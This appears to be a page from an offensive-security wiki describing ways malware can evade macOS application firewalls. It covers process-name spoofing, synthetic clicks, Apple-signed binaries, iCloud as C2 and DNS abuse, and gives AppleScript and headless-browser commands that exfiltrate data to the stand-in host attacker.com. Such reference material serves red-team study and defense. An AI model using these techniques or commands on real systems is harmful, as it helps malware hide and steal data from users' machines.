# macOS Bypassing Firewalls

{{#include ../../banners/hacktricks-training.md}}

## Found techniques

The following techniques were found working in some macOS firewall apps.

### Abusing whitelist names

- For example calling the malware with names of well known macOS processes like **`launchd`**

### Synthetic Click

- If the firewall ask for permission to the user make the malware **click on allow**

### **Use Apple signed binaries**

- Like **`curl`**, but also others like **`whois`**

### Well known apple domains

The firewall could be allowing connections to well known apple domains such as **`apple.com`** or **`icloud.com`**. And iCloud could be used as a C2.

### Generic Bypass

Some ideas to try to bypass firewalls

### Check allowed traffic

Knowing the allowed traffic will help you identify potentially whitelisted domains or which applications are allowed to access them

```bash
lsof -i TCP -sTCP:ESTABLISHED
```

### Abusing DNS

DNS resolutions are done via **`mdnsreponder`** signed application which will probably vi allowed to contact DNS servers.

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Via Browser apps

- **oascript**

```applescript
tell application "Safari"
    run
    tell application "Finder" to set visible of process "Safari" to false
    make new document
    set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```

- Google Chrome

```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```

- Firefox

```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```

- Safari

```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```

### Via processes injections

If you can **inject code into a process** that is allowed to connect to any server you could bypass the firewall protections:

{{#ref}}
macos-proces-abuse/
{{#endref}}

## References

- [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)

{{#include ../../banners/hacktricks-training.md}}



